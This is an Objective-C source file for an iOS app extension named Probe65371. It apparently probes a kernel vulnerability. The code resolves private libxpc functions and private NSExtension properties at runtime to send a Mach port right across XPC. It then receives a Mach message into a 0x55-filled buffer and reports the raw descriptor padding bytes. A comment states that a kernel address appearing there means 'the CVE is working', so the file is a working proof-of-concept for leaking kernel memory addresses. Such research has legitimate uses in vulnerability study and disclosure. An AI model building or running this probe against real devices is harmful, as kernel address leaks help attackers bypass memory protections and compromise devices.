/*
 * ProbeExtensionController.m — Probe65371 extension (v3.2.74).
 *
 * NSMachPort cannot survive NSXPCConnection serialization (the Mach right is
 * stripped in transit and the receiver gets nil).  Fix: wrap the send right
 * in an xpc_mach_send_t object and declare the reply argument with
 * -[NSXPCInterface setXPCType:forSelector:argumentIndex:ofReply:] so the XPC
 * transport layer transfers the actual kernel right instead of NSCoding it.
 * Private libxpc functions are resolved via dlsym at runtime.
 */

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#include <mach/mach.h>
#include <pthread.h>
#include <string.h>

/* ── Private libxpc Mach-send helpers (resolved via dlsym) ─────────── */

typedef void *xpc_obj_t;  /* alias to avoid conflict with system xpc.h types */

typedef xpc_obj_t (*fn_xpc_mach_send_create_t)(mach_port_t port);
typedef mach_port_t (*fn_xpc_mach_send_get_right_t)(xpc_obj_t obj);

static fn_xpc_mach_send_create_t    _fn_create    = NULL;
static fn_xpc_mach_send_get_right_t _fn_get_right = NULL;
static const void                  *_xpc_type_ms  = NULL;  /* XPC_TYPE_MACH_SEND */

static void load_xpc_mach_fns(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        _fn_create = dlsym(RTLD_DEFAULT, "xpc_mach_send_create");
        /* Try both known names for the "get right" extractor. */
        _fn_get_right = dlsym(RTLD_DEFAULT, "xpc_mach_send_get_right");
        if (!_fn_get_right)
            _fn_get_right = dlsym(RTLD_DEFAULT, "xpc_mach_send_copy_right");
        /* _xpc_type_mach_send is the type-tag used with setXPCType:. */
        _xpc_type_ms = dlsym(RTLD_DEFAULT, "_xpc_type_mach_send");
        NSLog(@"[Probe65371] libxpc: create=%p get_right=%p type_ms=%p",
              _fn_create, _fn_get_right, _xpc_type_ms);
    });
}

/* Register that reply argument 0 of probeWithReply: is a Mach-send XPC type. */
static void set_xpc_mach_send_type(NSXPCInterface *iface) {
    load_xpc_mach_fns();
    if (!_xpc_type_ms) {
        NSLog(@"[Probe65371] WARNING: _xpc_type_mach_send not found — Mach right may be nil at host");
        return;
    }
    SEL sel = NSSelectorFromString(@"setXPCType:forSelector:argumentIndex:ofReply:");
    if (![iface respondsToSelector:sel]) {
        NSLog(@"[Probe65371] WARNING: NSXPCInterface !respondsTo setXPCType:");
        return;
    }
    NSMethodSignature *sig = [iface methodSignatureForSelector:sel];
    NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
    inv.target   = iface;
    inv.selector = sel;
    const void *type    = _xpc_type_ms;
    SEL         proxySel = @selector(probeWithReply:);
    NSUInteger  argIdx  = 0;
    BOOL        reply   = YES;
    [inv setArgument:&type     atIndex:2];
    [inv setArgument:&proxySel atIndex:3];
    [inv setArgument:&argIdx   atIndex:4];
    [inv setArgument:&reply    atIndex:5];
    [inv invoke];
    NSLog(@"[Probe65371] setXPCType:MACH_SEND registered for probeWithReply: reply[0]");
}

/* ── Shared protocols (must match ProbeXPC.m exactly) ───────────────── */

@protocol Probe65371Protocol <NSObject>
/* Reply carries an xpc_mach_send_t (wrapped as id); registered via setXPCType. */
- (void)probeWithReply:(void(^)(id xpcPort))reply;
@end

@protocol ProbeResultProtocol <NSObject>
- (void)reportDescCount:(uint32_t)count
                  pad1s:(NSArray<NSNumber *> *)pad1Values
              portNames:(NSArray<NSNumber *> *)portNames
                  error:(NSString *)error;
@end

/* ── Receive-thread context ─────────────────────────────────────────── */

typedef struct {
    void        *conn_ref;  /* __bridge_retained NSXPCConnection* */
    mach_port_t  recv;
} recv_ctx_t;

static void *recv_thread(void *arg)
{
    recv_ctx_t *ctx = (recv_ctx_t *)arg;
    mach_port_t recv = ctx->recv;
    NSXPCConnection *conn = (__bridge_transfer NSXPCConnection *)ctx->conn_ref;
    free(ctx);

    uint8_t buf[4096] __attribute__((aligned(8)));
    /* Fill with 0x55 (not 0) so we can distinguish "kernel never touched pad1"
     * (0x55555555) from "kernel explicitly zeroed it" (0x00000000).
     * If pad1 comes back as a kernel VA (0xfffffff0…) the CVE is working. */
    memset(buf, 0x55, sizeof(buf));
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;

    kern_return_t kr = mach_msg(hdr,
                                MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                0, (mach_msg_size_t)sizeof(buf),
                                recv, 12000, MACH_PORT_NULL);

    NSLog(@"[Probe65371] recv_thread: mach_msg kr=0x%x  msgh_size=%u",
          (unsigned)kr, (unsigned)hdr->msgh_size);

    /* Raw hex dump of the first 96 bytes so we can see exactly what the
     * kernel wrote into the receive buffer (header + body + descriptors). */
    if (hdr->msgh_size > 0 && hdr->msgh_size <= sizeof(buf)) {
        mach_msg_size_t dump_len = hdr->msgh_size < 96 ? hdr->msgh_size : 96;
        NSMutableString *hex = [NSMutableString stringWithCapacity:dump_len * 3 + 20];
        for (mach_msg_size_t j = 0; j < dump_len; j++) {
            if (j % 16 == 0) [hex appendFormat:@"\n  [%3u] ", j];
            [hex appendFormat:@"%02x ", buf[j]];
        }
        NSLog(@"[Probe65371] recv raw bytes:%@", hex);
    }

    id<ProbeResultProtocol> proxy = [conn remoteObjectProxy];

    if (kr != MACH_MSG_SUCCESS) {
        NSString *err = [NSString stringWithFormat:@"mach_msg_recv kr=0x%x", (unsigned)kr];
        [proxy reportDescCount:0 pad1s:@[] portNames:@[] error:err];
        mach_port_deallocate(mach_task_self(), recv);
        return NULL;
    }

    uint32_t desc_count = 0;
    if (sizeof(buf) >= 28)
        memcpy(&desc_count, buf + 24, 4);
    if (desc_count > 8) desc_count = 8;

    NSMutableArray<NSNumber *> *pad1s = [NSMutableArray arrayWithCapacity:desc_count];
    NSMutableArray<NSNumber *> *names = [NSMutableArray arrayWithCapacity:desc_count];

    for (uint32_t i = 0; i < desc_count; i++) {
        size_t base = 28 + (size_t)i * 12;
        uint32_t portname = 0, pad1 = 0;
        if (base + 8 <= sizeof(buf)) {
            memcpy(&portname, buf + base,     4);
            memcpy(&pad1,     buf + base + 4, 4);
        }
        NSLog(@"[Probe65371] desc[%u] raw: name=0x%08x pad1=0x%08x  (at buf[%zu..%zu])",
              i, portname, pad1, base, base + 11);
        [pad1s addObject:@(pad1)];
        [names addObject:@(portname)];
    }

    [proxy reportDescCount:desc_count pad1s:pad1s portNames:names error:@""];
    mach_port_deallocate(mach_task_self(), recv);
    return NULL;
}

/* ── ProbeVendorContext ──────────────────────────────────────────────── */

@interface ProbeVendorContext : NSExtensionContext <Probe65371Protocol, ProbeResultProtocol>
@end

@implementation ProbeVendorContext

+ (NSXPCInterface *)_extensionAuxiliaryVendorProtocol
{
    load_xpc_mach_fns();
    NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(Probe65371Protocol)];
    set_xpc_mach_send_type(iface);
    return iface;
}

+ (NSXPCInterface *)_extensionAuxiliaryHostProtocol
{
    NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(ProbeResultProtocol)];
    [iface setClasses:[NSSet setWithObjects:[NSArray class], [NSNumber class], nil]
          forSelector:@selector(reportDescCount:pad1s:portNames:error:)
        argumentIndex:1 ofReply:NO];
    [iface setClasses:[NSSet setWithObjects:[NSArray class], [NSNumber class], nil]
          forSelector:@selector(reportDescCount:pad1s:portNames:error:)
        argumentIndex:2 ofReply:NO];
    return iface;
}

- (void)probeWithReply:(void(^)(id))reply
{
    load_xpc_mach_fns();
    NSLog(@"[Probe65371] probeWithReply: called — conforms vendor=%d host=%d",
          [self conformsToProtocol:@protocol(Probe65371Protocol)],
          [self conformsToProtocol:@protocol(ProbeResultProtocol)]);

    mach_port_t recv = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv) != KERN_SUCCESS) {
        NSLog(@"[Probe65371] mach_port_allocate failed");
        reply(nil); return;
    }
    if (mach_port_insert_right(mach_task_self(), recv, recv,
                               MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), recv);
        NSLog(@"[Probe65371] mach_port_insert_right failed");
        reply(nil); return;
    }

    NSXPCConnection *auxConn = nil;
    @try { auxConn = [self valueForKey:@"_auxiliaryConnection"]; }
    @catch (NSException *e) {
        NSLog(@"[Probe65371] _auxiliaryConnection threw: %@", e);
    }
    NSLog(@"[Probe65371] auxConn from self: %@", auxConn ?: @"<nil>");

    recv_ctx_t *ctx = malloc(sizeof(recv_ctx_t));
    ctx->recv     = recv;
    ctx->conn_ref = (__bridge_retained void *)auxConn;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_t thread;
    pthread_create(&thread, &attr, recv_thread, ctx);
    pthread_attr_destroy(&attr);

    NSLog(@"[Probe65371] recv thread started for port %u", recv);

    /* Wrap the send right as an xpc_mach_send_t so NSXPCConnection transfers
     * the actual kernel right.  xpc_mach_send_create() consumes the reference;
     * do NOT also deallocate recv (which holds both recv + send rights). */
    id xpcPort = nil;
    if (_fn_create) {
        xpc_obj_t raw = _fn_create(recv);
        xpcPort = (__bridge_transfer id)raw;
        NSLog(@"[Probe65371] xpc_mach_send wrapped port %u → %@", recv, xpcPort);
    } else {
        NSLog(@"[Probe65371] WARNING: xpc_mach_send_create unavailable — reply will be nil");
    }
    reply(xpcPort);
}

/* Stub — extension never receives this (host side gets it) */
- (void)reportDescCount:(uint32_t)count
                  pad1s:(NSArray<NSNumber *> *)pad1s
              portNames:(NSArray<NSNumber *> *)portNames
                  error:(NSString *)error
{
    NSLog(@"[Probe65371] ProbeVendorContext reportDescCount: unexpected call (stub)");
}

@end

/* ── Principal class ────────────────────────────────────────────────── */

@interface ProbeExtensionController : NSObject <NSExtensionRequestHandling>
@end

@implementation ProbeExtensionController

- (void)beginRequestWithExtensionContext:(NSExtensionContext *)context
{
    NSLog(@"[Probe65371] beginRequestWithExtensionContext: iOS %@  contextClass=%@",
          [NSProcessInfo processInfo].operatingSystemVersionString,
          NSStringFromClass([context class]));
    NSLog(@"[Probe65371] conformsToProtocol: vendor=%d host=%d",
          [context conformsToProtocol:@protocol(Probe65371Protocol)],
          [context conformsToProtocol:@protocol(ProbeResultProtocol)]);

    NSXPCConnection *auxConn = nil;
    @try { auxConn = [context valueForKey:@"_auxiliaryConnection"]; }
    @catch (NSException *e) {
        NSLog(@"[Probe65371] diag: _auxiliaryConnection threw: %@", e);
    }
    NSLog(@"[Probe65371] diag: auxConn=%@ exportedObject=%@ exportedInterface=%@",
          auxConn ?: @"<nil>",
          auxConn.exportedObject ?: @"<nil>",
          auxConn.exportedInterface ?: @"<nil>");
}

@end
